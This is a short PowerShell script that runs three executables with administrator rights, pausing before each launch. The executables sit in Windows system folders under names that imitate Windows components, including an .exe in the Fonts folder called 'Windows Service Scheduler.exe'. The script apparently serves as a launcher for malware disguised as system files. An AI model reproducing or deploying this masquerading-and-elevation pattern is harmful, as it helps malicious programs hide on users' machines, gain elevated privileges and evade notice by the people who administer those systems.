# Define binaries to run as admin with their working directories
$binaries = @(
    @{ Path = "C:\Windows\Fonts\Windows Service Scheduler.exe"; WorkingDirectory = "C:\Windows\Fonts" },
    @{ Path = "C:\Windows\SysWOW64\WinCore.exe"; WorkingDirectory = "C:\Windows\SysWOW64" },
    @{ Path = "C:\Windows\SystemApps\WindowsUpdater.exe"; WorkingDirectory = "C:\Windows\SystemApps" }
)


# Run each binary as administrator
foreach ($binary in $binaries) {
    $filePath = $binary.Path
    $workingDir = $binary.WorkingDirectory

    if (Test-Path -Path $filePath) {
        try {
		Start-Sleep -Seconds 5
            Start-Process -FilePath $filePath -Verb RunAs -WorkingDirectory $workingDir
            Write-Output "Executed $filePath as administrator"
        }
        catch {
            Write-Output "Failed to execute $filePath as administrator - $($_.Exception.Message)"
        }
    }
    else {
        Write-Output "Binary not found: $filePath"
    }
}